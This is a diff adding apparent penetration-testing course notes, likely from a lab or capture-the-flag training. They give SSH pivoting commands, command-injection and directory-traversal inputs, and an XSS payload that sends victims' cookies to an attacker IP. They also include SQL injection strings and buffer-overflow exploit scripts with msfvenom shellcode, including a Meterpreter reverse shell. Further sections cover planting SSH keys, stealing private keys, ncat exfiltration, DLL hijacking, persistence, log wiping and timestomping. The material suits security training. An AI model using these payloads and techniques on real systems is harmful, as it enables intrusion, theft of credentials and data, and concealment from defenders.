@@ -236,6 +236,965 @@ to check to make sure connections is connected
 ss -antlp
 
 
+## WEB EXPLOIT
+
+Run the following to chain/stack our arbitrary command
+
+; cat /etc/passwd
+
+# Check Tunnel
+nc 127.0.0.1 42071
+
+# Create Master Socket
+ssh -MS /tmp/demo demo1@10.50.12.21 -nF 2>/dev/null
+ssh -S /tmp/demo demo1@10.50.12.21
+
+# Host Enumeration, Ping Sweep (from remote box)
+for i in {1..255}; do (ping -c 1 10.208.50.$i | grep "bytes from" &); done
+
+# Port Enumeration with dynamic and proxychains
+ssh -S /tmp/demo demo -O forward -D 9050
+ss -antlp | grep 9050 #sanity check, verify port opened
+proxychains nmap 10.208.50.42
+
+# Tunnel to...
+10.208.50.42
+22/tcp open ssh
+ssh -S /tmp/demo demo -O forward -L 42070:10.208.50.42:80
+ssh -MS /tmp/demo demo1@10.50.12.21 -nF 2>/dev/null
+
+80/tcp open http
+ssh -S /tmp/demo demo -O forward -L 42070:10.208.50.42:22
+ssh -MS /tmp/t1 www-data@127.0.0.1 -p 42071 -fN 2>/dev/null
+ssh -MS /tmp/t1 -i $HOME/.ssh/id_rsa www-data@127.0.0.1 -p 42071 -fN 2>/dev/null
+
+# HTTP enumeration, We would add notes to pages we find
+Check /robots.txt
+
+proxychains nmap --script+http-enum 10.208.50.42 80
+|    /robots.txt
+|    /java/
+|    /path/
+|    /uploads/
+
+# Directory Traversal takes advantage of READING files and using absolute path 
+../../../../../../etc/passwd
+../../../../../../etc/hosts
+
+127.0.0.1:42070/path/pathdemo.php?myfile=../../../../../../etch/passwd
+
+# CMD injection uses semi-colin to run commands (not an active shell cant cd)
+; whoami
+
+
+# JavaScript
+Open inspector
+find JS by looking for functions (
+open console in inspector and run js manually, e.g. changetext()
+
+
+# Steal Cookie
+setup nc
+nc -lvpk 10.50.187.52 42071 # Where you want to intercept cookie
+
+post to chat....
+<script>document.location="http://10.50.187.52:42071/?username=" + document.cookie;</script>
+
+127.0.0.1:42070/uploads
+# Malicious upload requires 1. Upload 2. Find uploads, 3. Call upload
+touch 503.png.php
+vim 503.png.php
+
+#### SSH KEYGEN #### important af
+Identify user and home directory using whoami and cat /etc/passwd
+
+# Generate Our Key
+## From Linops
+ssh-keygen -t rsa -b 4096 # enter for default option
+No passpharsse
+
+cat /home/student/.ssh/id_rsa.pub
+
+## On Target, make directory and verify
+; mkdir /var/www/.ssh
+; ls -la /var/www
+
+
+## On Traget, upload key and verify
+; echo "" > /var/www/.ssh/authorized_keys # Paste whole key into echo
+; cat /var/www/.ssh/authorized_keys
+
+
+
+## SQL INJECTION
+Input to Inject:
+
+1 or 1=1; #
+
+Server-Side Query becomes:
+
+SELECT product FROM item WHERE id = 1 or 1=1; # limit 1;
+
+Audi 'Union select 1,2,3,4,5 #'
+
+'OR 1='1
+
+
+1. Find vulnerable input & 'OR 1='1
+Selection=3 or 1=1
+
+2. Numbers of columns with numbers
+Audi' UNION SELECT 1,2,3,4,5 FROM information_schema.tables #
+Selection=3 UNION SELECT 1,2,3 #
+
+3. Golden statement
+Audi' UNION SELECT 1,2,table_schema,table_name,column_name FROM information_schema.columns; #
+Selection=2 UNION SELECT table_schema,table_name,column_name FROM information_schema.columns; #
+
+4. Audi' UNION SELECT tireid,2,size,cost,5
+
+Selection=2 UNION SELECT null,name,color FROM car
+
+
+
+1 	session 	user 	id
+1 	session 	user 	name
+1 	session 	user 	pass
+1 	session 	userinfo 	studentID
+1 	session 	userinfo 	username
+1 	session 	userinfo 	passwd
+
+
+
+Blind Injection
+Inlcudes Statements to determine how DB is configured
+
+Columns in Output
+
+Can we return errors
+
+Can we return expected Output
+
+Used when unsanitized fields give generic error or no messages
+
+
+Normal Query to pull expected output:
+
+php?item=4
+
+
+Blind injection for validation:
+
+php?item=4 OR 1=1
+
+Try ALL combinations! item=1, item=2, item=3, etc.
+
+
+
+Abuse The Client (GET METHOD)
+Passing injection through the URL:
+
+After the .php?item=4 pass your UNION statement
+
+prices.php?item=4 UNION SELECT 1,2
+
+prices.php?item=4 UNION SELECT 1,2,@@version
+What is @@version
+
+
+
+
+Abuse The Client (Enum)
+Identifying the schema leads to detailed queries to enumerate the DB
+
+
+Research Database Schemas and what information they provide
+
+
+php?item=4 UNION SELECT 1,table_name,3 from information_schema.tables where table_schema=database()
+
+
+## EXPLIOT DEVELOPEMENT
+ ## Download func
+2
+3 ##Static Analysis
+4 # strings func
+5 # file func
+6       ##Wants a String, is an ELF
+7
+8 ##Behavioral Analysis
+9 # chmod u+x func
+10 # run it ./func
+11 ## Command Substitution (parameter):
+12      #  ./func $(echo "12345")
+13 ## USER INPUT:
+14      # ./func <<<$(echo "12345") -> always test this
+15 show functions
+
+EIP is where i need to look for are next steps
+Run the script then change the length to 100 on website
+copy the pattern and put it in your script -> run script again
+Take EIP hex value -> insert in website to find offset
+update script to hold the new ofset value
+use this website https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+
+#!/usr/bin/env python
+offset = "A" * 62
+EIP = "BBBB"
+
+print(offset + EIP ) 
+run <<<$(python myscript.py)
+
+16 ## Dynamic Analysis
+17  # -> Fuzzing trying to break
+18      # ./func <<<$(echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
+19
+20 # gdb ./func
+21      #shell (gives shell)
+22      #exit (gets back to gdb)
+23      #info functions
+24      #run (Ctrl + c to exit)
+25      #info functions again (more output)
+26 ##disassembly
+27      #pdisass main
+28      #pdisass <new function call>
+
+
+# From a shell on target system
+env - gdb ./func
+show env
+unset env LINES
+unset env COLUMNS
+"run" -> ctrl + c
+info proc map
+step  -> run this till you can see stack and heap
+info proc map
+find /b <first>, <last>, 0xff, 0xe4
+
+grab a few jumps
+big endian to little 
+f7 de 3b 59 -> \x59\x3b\xde\xf7 -> insert into script in EIP
+0xf7f588ab
+0xf7f645fb
+0xf7f6460f
+0xf7f64aeb
+Insert NOP = "\x90" * 15 -> update print statement
+msfvenom -p linux/x86/exec CMD=whoami -b "\x00\xfe\x20\x0a\xff" -f python  -> bad bytes dont change
+copy buf -> insert to sript -> update print statement
+
+
+offset = "A" * 62
+EIP = "\x59\x3b\xde\xf7"
+NOP = "\x90" * 15
+buf =  b""
+buf += b"\xba\x4c\xb2\x08\x9c\xd9\xc2\xd9\x74\x24\xf4\x5f"
+buf += b"\x31\xc9\xb1\x0b\x31\x57\x14\x83\xc7\x04\x03\x57"
+buf += b"\x10\xae\x47\x62\x97\x76\x31\x21\xc1\xee\x6c\xa5"
+buf += b"\x84\x09\x06\x06\xe4\xbd\xd7\x30\x25\x5f\xb1\xae"
+buf += b"\xb0\x7c\x13\xc7\xc4\x82\x94\x17\xbc\xea\xfb\x76"
+buf += b"\x2f\x83\x03\x2e\xfc\xda\xe5\x1d\x82"
+
+print(offset + EIP + NOP + buf)
+run
+
+
+
+
+
+Provided: Executable Package: inventory.exe
+Task: Perform a local buffer overflow on the vulnerable Linux executable, in order to gain access to the desired intel.
+Method: Utilize RE toolset and python to launch and develop exploit.
+
+ASLR is disabled on the target machine.
+
+Exploit this binary found on 192.168.28.111 at /.hidden/inventory.exe to escalate privileges from your pivot user to root.
+
+Enter the contents of /.secret/.verysecret.pdb as the flag
+
+Your flag will be a unique string of twenty random characters
+
+
+0x f7 df 1b 51
+0xf7f6674b
+0xf7f72753
+0xf7f72c6b
+0xf7f72df7
+0xf7f7307b
+
+"TRUN /.:/"
+"HELP"
+
++++++++++++++++++++Windows Buffer Overflow
+
+1 #Static Analysis
+2     strings.exe <filename>
+3     GUI > Properties
+4 #Behavioral Analysis
+5     RUN IT <program> via gui or in terminal
+6     netstat -anob <look for port>
+7     get-process | findstr /i <string to lookup> ex. vuln, secure
+8 #Dynamic Analysis
+9     Run immunity debugger -> File then attached -> make sure program was running before starting
+10    To unpause hit rewind -> then play -> make script on nix box
+#!/usr/bin/python
+import socket
+buf = "HELP"
+s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) #create socket
+s.connect(("10.50.136.106", 9999)) #connecting to TargetIP/Port
+print s.recv(1024) # print response
+s.send(buf) #sends value of buf
+print s.recv(1024) #print response
+s.close() #closes the socket
+
+FUZZING
+buf = "TRUN /.:/"
+buf += "A" * 5000 
+go to wiremask 5000 length -> insert in script comment out buf +=
+run then get eip and insert to get offset vaule then insert 4 "BBBB"
+
+
+#!/usr/bin/python
+import socket
+buf = "TRUN /.:/"
+buf += "A" * 2003
+buf += "BBBB"
+#buf += "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3$
+s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) #create socket
+s.connect(("10.50.136.106", 9999)) #connecting to TargetIP/Port
+print s.recv(1024) # print response
+s.send(buf) #sends value of buf
+print s.recv(1024) #print response
+s.close() #closes the socket
+
+
+11  !mona modules #searchs for bad module, look for falses accross the board
+12  !mona jmp -r esp -m "essfunc.dll" -> windows log data
+  Convert 
+  0x 62 50 11 af ->  \xaf\x11\x50\x62
+  0x 62 50 11 bb ->  \xbb\x11\x50\x62
+  0x 62 50 11 c7 ->  \xc7\x11\x50\x62
+
+JMP ESP -> buf += "\xaf\x11\x50\x62" # bottom left 
+
+NOP SLED -> buf += "\x90" * 10
+                                                                                                                         "BAD BYTES"
+PAYLOAD -> run this to get payload:   msvenom -p windows/meterpreter/reverse_tcp lhost=10.50.139.158 lport=4444 -b "\x00\xfe\x20\x0a\xff" -f python
+                                                                                                                         
+            
+#!/usr/bin/python
+import socket
+buf = "TRUN /.:/"
+#FUZZ:
+buf += "A" * 2003
+#JMP ESP:
+buf += "\xaf\x11\x50\x62"
+#NOP SLED:
+buf += "\x90" * 10
+
+## PAYLOAD:
+
+#msvenom -p windows/meterpreter/reverse_tcp lhost=10.50.139.158 lport=4444 -b "\x00\xfe\x20\x0a\xff" -f python
+buf += b"\xbd\x14\x2d\xbf\x43\xda\xc7\xd9\x74\x24\xf4\x5b"
+buf += b"\x33\xc9\xb1\x59\x31\x6b\x14\x83\xc3\x04\x03\x6b"
+buf += b"\x10\xf6\xd8\x43\xab\x79\x22\xbc\x2c\xe5\xaa\x59"
+buf += b"\x1d\x37\xc8\x2a\x0c\x87\x9a\x7f\xbd\x6c\xce\x6b"
+buf += b"\xb2\xc5\xa5\xb5\xfd\xd6\xb1\xc8\xd5\x19\x06\x80"
+buf += b"\x1a\x38\xfa\xdb\x4e\x9a\xc3\x13\x83\xdb\x04\xe2"
+buf += b"\xe9\x34\xd8\x7e\x43\xda\x8a\x0b\x26\xe6\x35\xdc"
+buf += b"\x2c\x56\x4e\x59\xf2\x22\xe2\x60\x23\x9a\x71\x2a"
+buf += b"\xdb\x91\xde\x8b\xda\x76\x5b\x02\xa8\x44\x55\x6a"
+buf += b"\x18\x3f\xa1\x1f\x9a\xe9\xfb\xdf\x31\xd4\x33\xd2"
+buf += b"\x48\x11\xf3\x0d\x3f\x69\x07\xb3\x38\xaa\x75\x6f"
+buf += b"\xcc\x2c\xdd\xe4\x76\x88\xdf\x29\xe0\x5b\xd3\x86"
+buf += b"\x66\x03\xf0\x19\xaa\x38\x0c\x91\x4d\xee\x84\xe1"
+buf += b"\x69\x2a\xcc\xb2\x10\x6b\xa8\x15\x2c\x6b\x14\xc9"
+buf += b"\x88\xe0\xb7\x1c\xac\x09\x48\x21\xf0\x9d\x84\xec"
+buf += b"\x0b\x5d\x83\x67\x7f\x6f\x0c\xdc\x17\xc3\xc5\xfa"
+buf += b"\xe0\x52\xc1\xfc\x3f\xdc\x82\x02\xc0\x1c\x8a\xc0"
+buf += b"\x94\x4c\xa4\xe1\x94\x07\x34\x0d\x41\xbd\x3e\x99"
+buf += b"\x60\x73\xb4\xc7\x1d\x71\xca\xe6\x81\xfc\x2c\x58"
+buf += b"\x6a\xae\xe0\x19\xda\x0e\x51\xf2\x30\x81\x8e\xe2"
+buf += b"\x3a\x48\xa7\x89\xd4\x24\x9f\x25\x4c\x6d\x6b\xd7"
+buf += b"\x91\xb8\x11\xd7\x1a\x48\xe5\x96\xea\x39\xf5\xcf"
+buf += b"\x8c\xc1\x05\x10\x39\xc1\x6f\x14\xeb\x96\x07\x16"
+buf += b"\xca\xd0\x87\xe9\x39\x63\xcf\x16\xbc\x55\xbb\x21"
+buf += b"\x2a\xd9\xd3\x4d\xba\xd9\x23\x18\xd0\xd9\x4b\xfc"
+buf += b"\x8c\xc1\x05\x10\x39\xc1\x6f\x14\xeb\x96\x07\x16"
+buf += b"\xca\xd0\x87\xe9\x39\x63\xcf\x16\xbc\x55\xbb\x21"
+buf += b"\x2a\xd9\xd3\x4d\xba\xd9\x23\x18\xd0\xd9\x4b\xfc"
+buf += b"\x80\x8a\x6e\x03\x1d\xbf\x22\x96\x9e\xe9\x97\x31"
+buf += b"\xf7\x17\xc1\x76\x58\xe8\x24\x05\x9f\x16\xba\x22"
+buf += b"\x38\x7e\x44\x73\xb8\x7e\x2e\x73\xe8\x16\xa5\x5c"
+buf += b"\x07\xd6\x46\x77\x40\x7e\xcc\x16\x22\x1f\xd1\x32"
+buf += b"\xe2\x81\xd2\xb1\x3f\x32\xa8\xba\xc0\xb3\x4d\xd3"
+buf += b"\xa4\xb4\x4d\xdb\xda\x89\x9b\xe2\xa8\xcc\x1f\x51"
+buf += b"\xa2\x7b\x3d\xf0\x29\x83\x11\x02\x78"
+
+
+#buf += "BBBB"
+#buf += "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3$
+s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) #create socket
+s.connect(("10.50.136.106", 9999)) #connecting to TargetIP/Port
+print s.recv(1024) # print response
+s.send(buf) #sends value of buf
+print s.recv(1024) #print response
+s.close() #closes the socket
+
+#SETUP MSFCONSOLE
+'''
+msfconsole
+use multi/handler
+show options
+set payload windows/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 4444
+exploit
+'''
+
+
+#go to msfconsole#
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 4444
+exploit
+
+reset immunity debugger
+run script on linux
+
+
+## POST EXPLIOT
+
+#User Enumeration
+Windows: -> net user
+
+Linux: -> cat /etc/passwd
+
+#Process Enumeration
+Windows: -> tasklist /v
+
+Linux: -> ps -elf
+
+#Service Enumeration
+Windows: -> tasklist /svc
+
+Linux : -> chkconfig                   # SysV
+        -> systemctl --type=service    # SystemD
+
+
+#Network Connection Enumeration
+Windows: -> ipconfig /all
+
+Linux: -> ifconfig -a      # SysV (deprecated)
+       -> ip a             # SystemD
+
+
+#Stealing SSH Keys (Living off the Land)
+Finding private keys (id_rsa) is like finding passwords.
+
+Authorized Key (Public): Grants access TO this box.
+
+Identity Key (Private): Authenticates FROM this box to others.
+
+1. Fix permissions (crucial!)
+chmod 600 stole_key
+
+2. Authenticate using the stolen key
+# Try the user who owned the key (e.g., stole from jane -> log in as jane)
+ssh -i stolen_key jane@target_internal_ip
+
+
+#Data Exfiltration
+Session Transcript: -> ssh <user>@<host> | tee session.log
+
+Obfuscation (Windows): -> type <file> | %{$_ -replace 'a','b' -replace 'b','c' -replace 'c','d'} > translated.out
+                       -> certutil -encode <file> encoded.b64
+
+Obfuscation (Linux): -> cat <file> | tr 'a-zA-Z0-9' 'b-zA-Z0-9a' > shifted.txt
+                     -> cat <file> | base64
+
+Encrypted Transport: -> scp <source> <destination>
+                     ->ncat --ssl <ip> <port> < <file>
+
+
+
+HOST ENUMERATION LINUX
+
+(Focus on information gathering for exploiting later)
+
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/?redirect
+
+
+What are we trying to accomplish doing host enumeration?
+    • Gathering information about the environment in order  to escalate privileges, gather more information about the network, learn the habits of an admin is he a baddie.. There was times during ops you had to actually fix their own network for them in order to complete a task
+
+When checking directories remember to always use ls -la. You never know what can be hiding.
+
+
+
+Linux Commands
+date & time	        knowing date and time can help correlate logs and identify target's time zone 
+whoami	            who we are logged in as
+id		            permissions group ( do we have root permissions)
+groups 	            see what groups we are in (are we in the sudoers)
+sudo -l             do we have any binaries that execute with higher privs  
+cat /etc/passwd	    user information
+cat /etc/shadow     user information (need privileged access)
+w                   who is logged in, terminal and what they are doing (tty are direct connections to the pc.. So pts are ssh or telnet connections)
+last                information about users that logged in (user habits, might need to avoid times)
+uptime              how long has the machine been up (would this make for a good pivot)
+hostname            name of machine
+uname -a            kernel information architecture
+cat /etc/*rel*      OS version information
+
+
+Networking Information
+
+ip addr                 info about the network interfaces (IPs, subnets, etc.)
+ifconfig -a             info about the network interfaces (IPs, subnets, etc.) (Depricated)
+cat /etc/hosts          translates hostnames or domain names to ip addresses ( could see a name to another box, might point a target of interest Windows Server )
+cat /etc/resolv.conf    configure dns name servers 
+ss -antp                displays TCP socket information (listening ports and established connections along with process associated with the socket)(-p needs root privs)
+netstat -antp           displays TCP socket information (listening ports and established connections along with process associated with the socket)(-p needs root privs)
+netstat -anup           displays UDP socket information
+netstat -rn             prints routing table
+arp -an                 prints arp table
+
+
+Process Information
+ps -ef                                  prints all processes in full-format listing
+ps -auxf 	                            prints all processes in and some other info in different format
+lsof -p [pid] 	                        list of open files opened by the process identified by its pid
+ls -al /proc/[pid]                      list directrory of a specific pid
+service --status-all    	            shows all services and if they are running or not 
+systemctl list-units --type=service     another way to list all services depending on type of linux system
+
+
+
+Logging
+cat /etc/rsyslog.conf   default rsyslog config file, check rules and for remote logging 
+/etc/rsyslog.d 		    directory where config files are kept we want to check those also.
+/var/log		        default location for linux system logs
+
+
+Crontabs
+Why might we want to check Crontabs? What could we take advantage of?
+Crontabs are owned by respective users so you will not be able to see other users crontabs.
+Multiple ways and places to look for cron jobs/scripts.
+/var/spool/cron/crontabs
+/etc/cron.d
+ls -la /etc/cron*
+cat /etc/cron*  crontab
+sudo crontab -u student -l
+
+
+
+Finding files and locations to check
+find usaga examples:
+find / -name password* 2>/dev/null      find any file starting with the word password 
+find / -iname *test* 2>/dev/null        find any file with "test" somewhere in its name, ignoring capitalization
+find / -type f -name *.txt              find all .txt files        
+find / -type f -name ".*"               find all hidden files
+find / -type d -name ".*"               find all hidden directories
+
+
+
+/tmp		check tmp folders (world writable)
+/home	 	check home folders for users
+/etc        default location for config files
+
+
+
+HOST ENUMERATION WINDOWS
+
+General Information
+
+Date /t
+Time /t
+Hostname
+Whoami
+systeminfo
+
+User Information
+Net user
+Net localgroup
+Net localgroup administrators
+Net use ( if any shares are mapped)
+
+
+Network Information
+Ipconfig /all
+Ipconfig /displaydns
+Route print
+Netstat -ant
+Netstat -anob ( need to be admin)
+
+
+Interesting Locations
+Explorer - view - hidden items ( turn on show hidden items )
+Check users documents,downloads,desktops
+Dir c:\windows\prefetch ( admin ) = see what executables have been ran
+Dir /a:h
+dir /o:d /t:w c:\windows\system32
+dir /o:d /t:w c:\windows\system32\winevt\logs
+dir /o:d /t:w c:\windows\temp
+reg query hklm\software\microsoft\windows\currentversion\run /s   (don’t forget about hkcu) and runonce
+
+
+Process and Services 
+Tasklist /v
+Tasklist /svc
+tasklist /svc | findstr /i "PID"
+
+Services.msc ( gui )
+for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a
+Sc query <service name>
+
+Schtasks
+Task sch ( gui )
+schtasks /query /fo LIST /v
+schtasks /query 
+
+
+
+
+
+
+## WINDOWS EXPLIOT
+
+#Windows Access Control Model
+Access Tokens
+-> Security Identifier (SID) associations and Token associations
+Security Descriptors
+-> DACL
+   SACL
+   ACEs
+
+
+#DLL Search Order
+Executables check the following locations (in successive order):
+-> HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
+
+####The directory the the Application was run from -> very important
+The directory specified in in the C+ function GetSystemDirectory()
+The directory specified in the C+ function GetWindowsDirectory()
+The current directory
+
+#Windows Integrity Mechanism
+Integrity Levels
+
+Untrusted
+-> Anonymous SID access tokens
+
+Low
+-> Everyone SID access token (World)
+
+Medium
+-> Authenticated Users
+
+High
+-> Administrators
+
+System
+-> System services (LocalSystem, LocalService, NetworkService)
+
+
+#User Account Control (UAC)
+Always Notify
+Notify me only when programs try to make changes to my computer
+Notify me only when programs try to make changes to my computer (do not dim my desktop)
+Never notify
+
+#DEMO: Checking UAC Settings
+-> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+
+#AutoElevate Executables
+Requested Execution Levels:
+asInvoker
+highestAvailable
+
+
+#Scheduled Tasks & Services
+Items to evaluate include:
+
+Write Permissions
+Non-Standard Locations
+Unquoted Executable Paths
+Vulnerabilities in Executables
+Permissions to Run As SYSTEM
+
+#DEMO: Finding vulnerable Scheduled Tasks
+schtasks /query /fo LIST /v | findstr /i "system" or "Task To Run"
+
+#DEMO: Finding Vulnerable Services
+wmic service list full
+sc query
+
+DEMO: DLL Hijacking
+Identify Vulnerability
+
+Take advantage of the default search order for DLLs
+
+NAME_NOT_FOUND present in executable’s system calls
+
+Validate permissions
+
+Create and transfer Malicious DLL
+
+DEMO: Finding Vulnerable Services
+wmic service list full
+sc query
+
+#DEMO: Vulnerable services
+Identify Vulnerability
+Validate permissions
+Validate Executable Paths
+Replace with Malicious File
+
+(Get-Process | Where-Object -Property ProcessName -Like "putty*").kill()
+
+#Persistance
+-> System changes or binary uploads that provide the adversary continued access to system
+Survives:
+Reboots
+Credential changes
+DHCP IP reassignment
+Etc.
+
+Considerations include:
+File naming
+File location
+Timestomping
+Port selection
+
+
+#Registry
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\
+Run
+RunOnce
+
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\
+Run
+RunOnce
+
+#System usage
+ 
+wmic
+net
+netstat
+
+
+#DEMO: Audit Logging
+ -> Show all audit category settings
+auditpol /get /category:*
+ -> What does the below command show?
+auditpol /get /category:* | findstr /i "success failure"
+
+
+##Important Microsoft Event IDs
+
+4624/4625 -> Successful/failed login
+
+4720 -> Account created
+
+4672 -> Administrative user logged on
+
+7045 -> Service created
+
+
+#DEMO: Event Logging
+Storage: c:\windows\system32\config\
+File-Type: .evtx/.evt
+-> wevtutil el
+-> wmic ntevent where "logfile="<LOGNAME>" list full
+-> Get-Eventlog -List
+
+
+#DEMO: Additional Logging
+Determine PS version (bunch of ways)
+-> reg query hklm\software\microsoft\powershell\3\powershellengine\
+-> powershell -command "$psversiontable"
+
+Determine if logging is set (PowerShell and WMIC)
+-> reg query [hklm or hkcu]\software\policies\microsoft\windows\powershell
+-> reg query hklm\software\microsoft\wbem\cimom \| findstr /i logging
+-> # 0 = no | 1 = errors | 2 = verbose
+
+WMIC Log Storage
+%systemroot%\system32\wbem\Logs\
+
+
+
+#DEMO: Manipulating Logs and Files
+Find Files and Alter File attributes
+-> forfiles /P c:\windows\system32 /S /D +05/14/2019
+-> wmic datafile where name='c:\\windows\\system32\\notepad.exe' get CreationDate, LastAccessed, LastModified
+-> copy /b filename.ext +,,
+-> $(Get-Item file.ext).lastaccesstime=$(date) |$(Get-Item test.txt).lastaccesstime=$(Get-Date "07/07/2004")
+
+Clear Event Logs (produces logging!):
+-> wevtutil clear-log Application
+-> Clear-Eventlog -Log Application, System
+
+
+
+## LINUX EXPLIOT
+
+
+SUDO Gotchas!
+Commands that can access the contents of other files
+Commands that download files
+Commands that execute other commands (i.e. editors)
+Dangerous commands
+
+sudo -l -> to see what commands you can run as sudo
+
+Ways To Figure Out Init Type
+ls -latr /proc/1/exe
+stat /sbin/init
+man init
+init --version
+ps 1
+
+
+Auditing SystemV
+ausearch: Pulls from audit.log
+
+ausearch -p 22
+ausearch -m USER_LOGIN -sv no
+ausearch -ua edwards -ts yesterday -te now -i
+
+
+SystemD
+Utilzes journalctl
+
+journalctl _TRANSPORT=audit
+journalctl _TRANSPORT=audit | grep 603
+
+
+Logs for Covering Tracks
+Logs typically housed in /var/log & useful logs:
+
+auth.log/secure
+Logins/authentications
+
+lastlog
+Each users' last successful login time
+
+btmp
+Bad login attempts
+
+sulog
+Usage of SU command
+
+utmp
+Currently logged in users (W command)
+
+wtmp
+Permanent record on user on/off
+
+
+
+Working With Logs
+file /var/log/wtmp
+find /var/log -type f -mmin -10 2> /dev/null
+journalctl -f -u ssh
+journalctl -q SYSLOG_FACILITY=10 SYSLOG_FACILITY=4
+
+
+
+Reading Files
+cat /var/log/auth.log | egrep -v "opened|closed"
+awk '/opened/' /var/log/auth.log
+last OR lastb OR lastlog
+strings OR dd            # for data files
+more /var/log/syslog
+head/tail
+Control your output with pipes | and more
+
+
+
+Cleaning The Logs
+Before we start cleaning, save the INODE!
+
+Affect on the inode of using mv VS cp VS cat
+
+Know what we are removing (Entry times? IP? Whole file? Etc.)
+
+
+
+Cleaning The Logs (Basic)
+Get rid of it
+
+rm -rf /var/log/...
+Clear It
+
+cat /dev/null > /var/log/...
+echo > /var/log/...
+
+
+
+
+Cleaning The Logs (Precise)
+Always work off a backup!
+
+GREP (Remove)
+egrep -v '10:49*| 15:15:15' auth.log > auth.log2; cat auth.log2 > auth.log; rm auth.log2
+
+SED (Replace)
+cat auth.log > auth.log2; sed -i 's/10.16.10.93/136.132.1.1/g' auth.log2; cat auth.log2 > auth.log
+
+
+Timestomp (Nix)
+Easy with Nix vs Windows (Native change of Access & Modify times)
+
+touch -c -t 201603051015 1.txt   # Explicit
+touch -r 3.txt 1.txt    # Reference
+
+
+Rsyslog
+Newer Rsyslog references /etc/rsyslog.d/* for settings/rules
+
+Older version only uses /etc/rsyslog.conf
+
+Find out
+grep "IncludeConfig" /etc/rsyslog.conf
+
+
+
+Reading Rsyslog
+Utilizes severity (priority) and facility levels
+
+Rules filter out, and can use keyword or number
+<facility>.<priority>
+
+
+Rsyslog Examples
+kern.*                                                # All kernel messages, all severities
+mail.crit
+cron.!info,!debug
+*.*  @192.168.10.254:514                                                    # Old format
+*.* action(type="omfwd" target="192.168.10.254" port="514" protocol="udp")   # New format
+#mail.*
+
+
+=====steps=====
+
+##SUDO##
+ sudo -l
+
+##SUID/SGID##
+find / -type f -perm /4000 -ls 2>/dev/null # Find SUID only files
+find / -type f -perm /2000 -ls 2>/dev/null # Find SGID only files
+find / -type f -perm /6000 -ls 2>/dev/null # Find SUID and SGID files
+
+gtfobins
+
+
+## "." in path ##
+echo $PATH
+
+
 
 
 
